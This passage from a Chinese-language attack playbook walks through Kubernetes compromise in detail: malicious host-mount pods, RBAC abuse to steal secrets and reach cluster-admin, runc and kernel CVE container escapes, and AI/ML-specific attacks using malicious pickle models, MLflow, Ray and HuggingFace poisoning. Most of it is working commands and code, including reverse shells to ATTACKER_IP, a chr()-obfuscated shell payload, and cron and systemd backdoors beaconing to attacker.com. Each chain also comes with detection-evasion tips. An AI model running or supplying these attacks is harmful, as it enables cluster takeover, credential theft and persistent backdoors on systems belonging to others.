      mountPath: /var/run    # 挂载 Docker socket（如果存在）
  volumes:
  - name: host-root
    hostPath:
      path: /
  - name: host-docker
    hostPath:
      path: /var/run
  tolerations:
  - key: node-role.kubernetes.io/control-plane  # 允许调度到控制平面节点
    operator: Exists
  - key: node-role.kubernetes.io/master         # 兼容旧版本
    operator: Exists
YAMLEOF

# 2.2 创建恶意 Pod
kubectl apply -f evil_pod.yaml

# 2.3 等待 Pod 运行
kubectl wait --for=condition=Ready pod/system-health-check --timeout=60s

# 2.4 进入 Pod 并 chroot 到宿主机根目录
kubectl exec -it system-health-check -- chroot /host /bin/bash
# 现在以 root 身份在宿主机上执行命令

# 2.5 在宿主机上窃取 kubelet 凭证
cat /etc/kubernetes/kubelet.conf
cat /var/lib/kubelet/pki/kubelet-client-current.pem

# 2.6 窃取其他 Pod 的 ServiceAccount Token
for pid in $(ls /proc/ | grep -E '^[0-9]+$'); do
  token_file="/proc/$pid/root/var/run/secrets/kubernetes.io/serviceaccount/token"
  if [ -f "$token_file" ]; then
    echo "=== PID $pid ===" >> all_sa_tokens.txt
    cat "$token_file" >> all_sa_tokens.txt
  fi
done

# ============================================================
# 步骤 3：RBAC 滥用路径 B — 读取 Secrets 窃取凭证
# ============================================================

# 前提: 拥有 secrets get/list 权限
# 3.1 列出所有命名空间的 Secrets
kubectl get secrets --all-namespaces -o json | jq '.items[] | {Namespace: .metadata.namespace, Name: .metadata.name, Type: .type}'

# 3.2 提取高价值 Secrets（默认 ServiceAccount Token、数据库密码、TLS 证书）
# 获取所有命名空间的 default SA Token
for ns in $(kubectl get namespaces -o jsonpath='{.items[*].metadata.name}'); do
  sa_token=$(kubectl get secret -n "$ns" -o jsonpath='{.items[?(@.type=="kubernetes.io/service-account-token")].metadata.name}' 2>/dev/null | head -1)
  if [ -n "$sa_token" ]; then
    echo "=== Namespace: $ns, Secret: $sa_token ===" >> all_secrets.txt
    kubectl get secret "$sa_token" -n "$ns" -o jsonpath='{.data.token}' | base64 -d >> all_secrets.txt
    echo "" >> all_secrets.txt
  fi
done

# 3.3 查找数据库密码 Secret
kubectl get secrets --all-namespaces -o json | jq -r '.items[] | select(.metadata.name | test("db|database|mysql|postgres|redis|mongo"; "i")) | "\(.metadata.namespace)/\(.metadata.name)"'

# 3.4 解码 Secret 内容
kubectl get secret DB_SECRET_NAME -n NAMESPACE -o jsonpath='{.data}' | jq -r 'to_entries[] | "\(.key): \(.value | @base64d)"'

# ============================================================
# 步骤 4：RBAC 滥用路径 C — pods/exec 横向移动
# ============================================================

# 前提: 拥有 pods/exec create 权限
# 4.1 列出所有 Pod，寻找高价值目标
kubectl get pods --all-namespaces -o wide

# 4.2 在目标 Pod 中执行命令（窃取应用凭据）
# 针对数据库 Pod
kubectl exec -it DB_POD -n NAMESPACE -- env | grep -i PASS

# 针对应用 Pod — 读取应用配置
kubectl exec -it APP_POD -n NAMESPACE -- cat /app/.env

# 针对 kube-system 中的 etcd Pod（集群核心）
kubectl exec -it etcd-CONTROL_PLANE_NODE -n kube-system -- \
  ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get / --prefix --keys-only

# ============================================================
# 步骤 5：RBAC 滥用路径 D — 提权到 cluster-admin
# ============================================================

# 前提: 拥有 clusterrolebindings create 权限（或可通过其他方式绑定 ClusterRole）
# 5.1 将当前 ServiceAccount 绑定到 cluster-admin ClusterRole
cat > privesc_binding.yaml << 'YAMLEOF'
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: system-monitoring-binding  # 伪装为监控绑定
subjects:
- kind: ServiceAccount
  name: default                    # 当前 SA 名称
  namespace: default               # 当前命名空间
roleRef:
  kind: ClusterRole
  name: cluster-admin              # 最高权限
  apiGroup: rbac.authorization.k8s.io
YAMLEOF

# 5.2 应用绑定（如果权限允许）
kubectl apply -f privesc_binding.yaml

# 5.3 验证 cluster-admin 权限
kubectl auth can-i '*' '*' --all-namespaces
# 输出: yes → 已获得集群管理员权限

# 5.4 读取所有命名空间的所有 Secrets（包括 kube-system 中的集群证书）
kubectl get secrets -n kube-system
# 获取集群 CA 证书和 admin 凭证
kubectl get secret -n kube-system -o jsonpath='{.items[?(@.metadata.name|test("admin"))].metadata.name}'
```

**检测绕过技巧**：
- 恶意 Pod 命名伪装为系统组件（"system-health-check"），标签设为 "monitoring"
- `tolerations` 配置使 Pod 可调度到控制平面节点（窃取 etcd/控制平面凭证）
- 通过 `/proc/<pid>/root/` 读取其他 Pod 的 SA Token，不触发 kubectl API 审计日志
- ClusterRoleBinding 命名伪装为 "system-monitoring-binding"，混入正常运维配置
- 使用 `kubectl auth can-i` 检查权限不产生副作用，不会触发告警
- etcd 直接读取通过 Pod 内 exec 执行，走 kubelet API 而非 API Server，可能绕过 API Server 审计

---

### 攻击链 3：CVE 容器逃逸 — runc / containerd 漏洞利用

**场景**：目标集群运行受影响版本的 runc/containerd。攻击者在容器内获取 shell 后，利用 CVE-2024-21626（runc 文件描述符泄露）实现容器逃逸到宿主机 root。

```bash
# ============================================================
# 步骤 1：确认容器运行时版本与漏洞适用性
# ============================================================

# 1.1 检查 runc 版本（在容器内或宿主机上）
runc --version
# CVE-2024-21626 影响 runc < 1.1.12

# 1.2 检查 containerd 版本
containerd --version
# CVE-2024-21626 也影响使用受影响 runc 的 containerd

# 1.3 检查当前容器是否受影响
# 容器内检查 runc 版本（通过 /proc）
cat /proc/1/status | grep "Name"  # 确认在容器内
# 检查容器运行时
cat /proc/self/cgroup | grep -oE '(docker|containerd|kubepods)'

# ============================================================
# 步骤 2：CVE-2024-21626 — runc 文件描述符泄露逃逸
# ============================================================

# 原理：runc 在执行 exec 时未正确关闭文件描述符（FD），
# 攻击者可通过 /proc/self/fd/ 访问宿主机文件系统
# 利用工作目录（WORKDIR）设为 /proc/self/fd/<N> 实现逃逸

# 2.1 构造恶意容器镜像（利用 WORKDIR 指向宿主机 FD）
cat > Dockerfile.cve-2024-21626 << 'DOCKEREOF'
# CVE-2024-21626 利用镜像
# WORKDIR 设为 /proc/self/fd/7（runc 泄露的宿主机文件系统 FD）
FROM alpine:latest
# FD 编号可能因环境而异，需尝试 3-10
WORKDIR /proc/self/fd/7
DOCKEREOF

# 2.2 构建恶意镜像
docker build -t cve-exploit -f Dockerfile.cve-2024-21626 .

# 2.3 运行恶意容器 — 容器启动时工作目录即为宿主机文件系统
# 通过 K8s 部署（如果有 pods create 权限）
cat > cve_pod.yaml << 'YAMLEOF'
apiVersion: v1
kind: Pod
metadata:
  name: cve-test
spec:
  containers:
  - name: exploit
    image: cve-exploit
    command: ["ls", "-la", "/"]
    # 容器启动时 CWD = /proc/self/fd/7 = 宿主机 /
    # ls / 将列出宿主机根目录内容
  restartPolicy: Never
YAMLEOF

kubectl apply -f cve_pod.yaml
kubectl logs cve-test
# 输出宿主机根目录内容（bin, boot, dev, etc, home, ...）

# 2.4 通过 exec 进入容器并执行宿主机命令
# 关键: 使用相对路径访问宿主机文件
kubectl exec -it cve-test -- sh
# 在容器内:
ls -la                         # 列出宿主机根目录
cat etc/shadow                 # 读取宿主机密码文件
cat etc/kubernetes/             # 读取 K8s 配置
cat root/.ssh/id_rsa           # 读取宿主机 SSH 私钥

# ============================================================
# 步骤 3：CVE-2022-0185 — Linux 内核文件系统上下文溢出（替代路径）
# ============================================================

# 原理：fs/context.c 中的整数溢出，允许非特权容器内
# 通过 unshare + mount 实现容器逃逸
# 影响: kernel < 5.16.11 (大量存量系统仍受影响)

# 3.1 检查内核版本
uname -r
# CVE-2022-0185 影响 < 5.16.11

# 3.2 检查是否可以使用 unshare（需要 CAP_SYS_ADMIN 或 user namespace）
cat /proc/sys/kernel/unprivileged_userns_clone  # 1 = 允许非特权用户命名空间

# 3.3 使用公开的 CVE-2022-0185 PoC
# 下载 exploit（公开 PoC: https://github.com/Crusaders-of-Rust/CVE-2022-0185）
git clone https://github.com/Crusaders-of-Rust/CVE-2022-0185.git
cd CVE-2022-0185

# 3.4 编译并执行
gcc -o exploit exploit.c -static
./exploit
# 利用成功后获得宿主机 root shell

# ============================================================
# 步骤 4：CVE-2024-21626 完整逃逸链（从 Web RCE 到宿主机 root）
# ============================================================

# 4.1 假设攻击者已通过 Web 应用 RCE 进入容器
# 在容器内确认环境
id                           # 确认当前用户（通常为 root 或 app 用户）
cat /proc/1/cgroup           # 确认在容器内
ls /.dockerenv               # 确认 Docker 容器

# 4.2 检查容器运行时版本
# runc 版本通常无法从容器内直接获取，但可通过 CVE 特征判断
# 尝试探测 /proc/self/fd/ 目录
ls -la /proc/self/fd/
# 如果看到 FD 指向宿主机路径（非容器内路径），说明存在 FD 泄露

# 4.3 枚举泄露的 FD（尝试 FD 3-10）
for fd in $(seq 3 10); do
  target=$(readlink /proc/self/fd/$fd 2>/dev/null)
  if echo "$target" | grep -qv "^/proc\|^pipe:\|^socket:\|^/dev"; then
    echo "[!] FD $fd 指向: $target（可能是宿主机路径）"
  fi
done

# 4.4 通过泄露的 FD 读取宿主机文件
# 假设 FD 7 指向宿主机根目录
HOST_ROOT=$(readlink /proc/self/fd/7)
echo "[+] 宿主机根目录通过 FD 7 可访问: $HOST_ROOT"

# 读取宿主机敏感文件
cat /proc/self/fd/7/etc/shadow
cat /proc/self/fd/7/etc/kubernetes/admin.conf
cat /proc/self/fd/7/root/.kube/config
cat /proc/self/fd/7/var/lib/kubelet/pki/kubelet-client-current.pem

# 4.5 使用窃取的 kubelet 凭证访问 K8s API
KUBELET_CERT="/proc/self/fd/7/var/lib/kubelet/pki/kubelet-client-current.pem"
KUBELET_KEY="/proc/self/fd/7/var/lib/kubelet/pki/kubelet-client-key.pem"
curl -sk --cert "$KUBELET_CERT" --key "$KUBELET_KEY" \
  "https://NODE_IP:10250/pods" | jq .

# 4.6 通过 kubelet API 在其他 Pod 执行命令
curl -sk -XPOST \
  --cert "$KUBELET_CERT" --key "$KUBELET_KEY" \
  "https://NODE_IP:10250/run/NAMESPACE/TARGET_POD/TARGET_CONTAINER" \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"

# ============================================================
# 步骤 5：持久化 — 在宿主机植入后门
# ============================================================

# 5.1 通过 FD 访问宿主机文件系统，写入 SSH 公钥
echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@kali" >> /proc/self/fd/7/root/.ssh/authorized_keys

# 5.2 写入 cron 反弹 shell（持久化）
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" >> /proc/self/fd/7/etc/crontab

# 5.3 修改宿主机 systemd 服务植入后门
cat > /proc/self/fd/7/etc/systemd/system/system-monitor.service << 'SVCEOF'
[Unit]
Description=System Monitoring Service

[Service]
Type=simple
ExecStart=/bin/bash -c "while true; do curl -s http://attacker.com/beacon | bash; sleep 60; done"
Restart=always

[Install]
WantedBy=multi-user.target
SVCEOF

# 5.4 在宿主机上启用后门服务（通过写入的 cron 或下次重启生效）
```

**检测绕过技巧**：
- CVE-2024-21626 利用不产生额外的网络流量，仅通过 `/proc/self/fd/` 文件系统操作
- FD 泄露探测使用 `readlink`（只读操作），不触发容器运行时安全策略
- 通过 FD 写入宿主机文件不经过 `mount` 系统调用，Falco 的"异常 mount 检测"规则无法捕获
- SSH 公钥注入是文件追加操作，不改变现有 authorized_keys 内容，难以通过文件完整性监控发现
- cron 后门使用标准 crontab 格式，与正常系统 cron 任务难以区分
- systemd 服务命名伪装为 "system-monitor"，混入正常系统服务

---

### 攻击链 4：2026 AI 容器逃逸 — ML 模型沙箱绕过

**场景**：2026 年企业广泛部署 AI/ML 推理服务，使用容器化沙箱隔离模型执行环境。攻击者通过恶意模型文件（pickle 反序列化）或 prompt injection 触发的代码执行，突破 ML 沙箱限制，逃逸到宿主机。

```bash
# ============================================================
# 步骤 1：识别 AI/ML 容器环境
# ============================================================

# 1.1 在容器内识别 ML 框架（确认在 AI 推理容器中）
pip list 2>/dev/null | grep -iE "torch|tensorflow|scikit|transformers|mlflow"
# 输出示例: torch 2.2.0, transformers 4.36.0, scikit-learn 1.4.0

# 1.2 检查 GPU 访问（AI 容器通常挂载 NVIDIA GPU）
nvidia-smi 2>/dev/null
ls /dev/nvidia* 2>/dev/null

# 1.3 检查模型文件位置
find / -name "*.pkl" -o -name "*.pth" -o -name "*.pt" -o -name "*.h5" -o -name "*.onnx" 2>/dev/null > model_files.txt
find / -name "model.pt" -o -name "pytorch_model.bin" 2>/dev/null >> model_files.txt

# 1.4 检查 ML 服务端口（推理 API）
netstat -tlnp 2>/dev/null | grep -E "8000|8500|5000|8080|11434"
# 常见 ML 服务端口: TorchServe (8080), TF Serving (8500), MLflow (5000), Ollama (11434)

# ============================================================
# 步骤 2：Pickle 反序列化 RCE — 恶意模型加载逃逸
# ============================================================

# 原理: Python pickle 在反序列化时可执行任意代码
# 如果 ML 服务加载用户上传的模型文件 → RCE

# 2.1 构造恶意 pickle 模型文件
python3 << 'PYEOF'
import pickle
import os

class MaliciousModel:
    """伪装为 PyTorch 模型的恶意 pickle 载荷"""
    def __reduce__(self):
        # pickle 反序列化时执行的系统命令
        # 命令: 反弹 shell 到攻击者服务器
        cmd = "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
        return (os.system, (cmd,))

# 将恶意对象保存为 pickle 文件（伪装为模型文件）
with open('malicious_model.pkl', 'wb') as f:
    pickle.dump(MaliciousModel(), f)

print("[+] 恶意模型文件已生成: malicious_model.pkl")
print("[*] 当目标 ML 服务加载此文件时，将触发反弹 shell")
PYEOF

# 2.2 如果目标 ML 服务接受模型上传（如 TorchServe, MLflow）
# 通过 API 上传恶意模型
# TorchServe 模型注册
curl -X POST "http://TARGET:8081/models?url=https://attacker.com/malicious_model.mar"

# MLflow 模型注册
python3 << 'PYEOF'
import mlflow
import mlflow.pyfunc

# 注册恶意模型到 MLflow Model Registry
class MaliciousModel(mlflow.pyfunc.PythonModel):
    def load_context(self, context):
        # 加载时执行恶意代码
        import os
        os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")
    
    def predict(self, context, model_input):
        return model_input

# 保存并注册模型
mlflow.pyfunc.save_model(
    path="malicious_model",
    python_model=MaliciousModel()
)
# 上传到 MLflow Server
mlflow.register_model(
    "runs:/MALICIOUS_RUN_ID/model",
    "backdoor-model"
)
PYEOF

# 2.3 当推理服务加载恶意模型时，触发反弹 shell
# 攻击者监听
nc -lvnp 4444
# 收到 shell 后，已在 ML 容器内获得 RCE

# ============================================================
# 步骤 3：从 ML 容器逃逸到宿主机（利用 GPU 驱动漏洞）
# ============================================================

# 3.1 检查容器 Capabilities 和设备挂载
capsh --print
# AI 容器通常需要 CAP_SYS_ADMIN（GPU 访问）或 CAP_SYS_PTRACE

# 3.2 检查 NVIDIA GPU 设备挂载（常见逃逸路径）
ls -la /dev/nvidia*
# /dev/nvidia0, /dev/nvidiactl, /dev/nvidia-uvm

# 3.3 利用 NVIDIA GPU 驱动漏洞逃逸
# CVE-2023-31019 (NVIDIA GPU Display Driver) 等驱动漏洞
# 可通过 GPU 设备文件访问宿主机内核内存
python3 << 'PYEOF'
import ctypes
import os

# 检查是否可访问 NVIDIA 设备文件
nvidia_devices = ['/dev/nvidia0', '/dev/nvidiactl', '/dev/nvidia-uvm']
for dev in nvidia_devices:
    if os.path.exists(dev):
        print(f"[+] 可访问 GPU 设备: {dev}")
        # 尝试打开设备文件（如果成功，说明容器有 GPU 访问权限）
        try:
            fd = os.open(dev, os.O_RDWR)
            print(f"  [!] {dev} 可读写 (FD={fd}) — 可利用 GPU 驱动漏洞逃逸")
            os.close(fd)
        except PermissionError:
            print(f"  [-] {dev} 权限不足")
PYEOF

# 3.4 利用 CUDA 共享内存逃逸
# AI 容器通常挂载 /dev/shm 用于 GPU 数据交换
# 如果 /dev/shm 未做大小限制，可通过共享内存溢出攻击
ls -la /dev/shm/
df -h /dev/shm
# 如果 /dev/shm 是宿主机的共享内存 → 可读写宿主机进程数据

# 3.5 利用 PyTorch/CUDA 的 IPC（进程间通信）逃逸
# PyTorch 的共享内存 tensor 可以跨容器共享
python3 << 'PYEOF'
import torch
import os

# 检查 PyTorch 共享内存
# 如果容器间共享 /dev/shm，可通过共享 tensor 注入恶意数据
shared_tensor = torch.zeros((1024, 1024)).share_memory_()
print(f"[+] 共享内存 tensor 已创建，FD: {shared_tensor._share_fd_() if hasattr(shared_tensor, '_share_fd_') else 'N/A'}")

# 检查 /dev/shm 中的共享文件
shm_files = os.listdir('/dev/shm')
print(f"[/dev/shm 内容]: {shm_files}")
# 如果看到其他容器的共享文件 → 可读写其他容器内存
PYEOF

# ============================================================
# 步骤 4：利用 ML 框架的分布式训练功能逃逸
# ============================================================

# 4.1 PyTorch 分布式训练 RPC 漏洞利用
# PyTorch RPC (torch.distributed.rpc) 允许跨节点执行函数
# 如果 RPC 端口可达，可远程执行任意代码

python3 << 'PYEOF'
import torch.distributed.rpc as rpc

# 连接到目标 PyTorch RPC 服务器（默认端口 29500）
# 目标通常是 AI 训练集群的工作节点
rpc.init_rpc(
    name="attacker",
    rank=0,
    world_size=2,
    rpc_backend_options=rpc.TensorPipeRpcBackendOptions(
        init_method="tcp://TARGET_NODE:29500"
    )
)

# 通过 RPC 在目标节点执行任意命令
@rpc.functions.async_execution
def malicious_fn():
    import os
    # 在远程节点执行命令
    result = os.popen("cat /etc/shadow && cat /root/.ssh/id_rsa").read()
    return result

# 调用远程函数
result = rpc.rpc_async("worker_node", malicious_fn).wait()
print(f"[+] 远程执行结果:\n{result}")
PYEOF

# 4.2 利用 Ray 框架的 Dashboard API（如果目标使用 Ray）
# Ray Dashboard 默认端口 8265，通常无认证
curl -s "http://TARGET:8265/api/version"
# 列出 Ray 集群节点
curl -s "http://TARGET:8265/api/actors"
# 提交恶意任务（在 Ray Worker 节点执行任意代码）
curl -s -X POST "http://TARGET:8265/api/jobs/" \
  -H "Content-Type: application/json" \
  -d '{
    "entrypoint": "python3 -c \"import os; os.system(chr(98)+chr(97)+chr(115)+chr(104)+chr(32)+chr(45)+chr(99)+chr(32)+chr(39)+chr(98)+chr(97)+chr(115)+chr(104)+chr(32)+chr(45)+chr(105)+chr(32)+chr(62)+chr(38)+chr(32)+chr(47)+chr(100)+chr(101)+chr(118)+chr(47)+chr(116)+chr(99)+chr(112)+chr(47)+chr(65)+chr(84)+chr(84)+chr(65)+chr(67)+chr(75)+chr(69)+chr(82)+chr(95)+chr(73)+chr(80)+chr(47)+chr(52)+chr(52)+chr(52)+chr(52)+chr(32)+chr(48)+chr(62)+chr(38)+chr(49)+chr(39))\"",
    "runtime_env": {}
  }'

# ============================================================
# 步骤 5：AI 模型供应链投毒 — 针对模型注册表
# ============================================================

# 5.1 如果攻击者有 MLflow/HuggingFace 模型仓库的写权限
# 替换正常模型为投毒模型

# 5.2 HuggingFace Hub 模型投毒
# 上传包含恶意 pickle 的模型
python3 << 'PYEOF'
from huggingface_hub import HfApi
import pickle
import os

# 构造恶意模型文件
class EvilModel:
    def __reduce__(self):
        # 反序列化时执行的命令（植入后门）
        cmd = "echo 'backdoor' > /tmp/pwned && curl http://attacker.com/pwned"
        return (os.system, (cmd,))

# 保存恶意模型
with open('pytorch_model.bin', 'wb') as f:
    pickle.dump(EvilModel(), f)

# 上传到 HuggingFace Hub（如果目标企业使用私有 Hub）
api = HfApi(token="HF_TOKEN")
api.upload_file(
    path_or_fileobj='pytorch_model.bin',
    path_in_repo='pytorch_model.bin',
    repo_id='target-org/customer-service-model',
    repo_type='model'
)
print("[+] 投毒模型已上传到 HuggingFace Hub")
print("[*] 当目标加载此模型时，将触发后门")
PYEOF

# 5.3 通过模型版本切换实现持久化
# 每次模型重新加载（如服务重启）时都会触发后门
```

**2026 AI 容器逃逸检测绕过技巧**：
- Pickle 反序列化 RCE 在模型加载时触发，此时通常是应用启动阶段，安全监控覆盖较弱
- 恶意模型文件通过标准 ML 框架 API（torch.load, mlflow.pyfunc）加载，不触发异常文件操作告警
- GPU 设备文件访问是 AI 容器的正常行为，难以通过设备文件监控区分正常与恶意访问
- PyTorch RPC 通信走标准分布式训练端口（29500），混入正常训练流量
- Ray Dashboard 无认证是已知配置问题，攻击者利用 API 提交任务看起来是正常的 Ray Job
- HuggingFace Hub 模型投毒利用了企业对内部模型仓库的信任，模型哈希校验尚未普及
- 2026 关键防御：启用 `pickle` 安全加载（`torch.load(weights_only=True)`）、模型签名验证（cosign）、ML 沙箱使用 gVisor/Kata Containers、Ray Dashboard 强制认证、模型仓库访问控制与审计
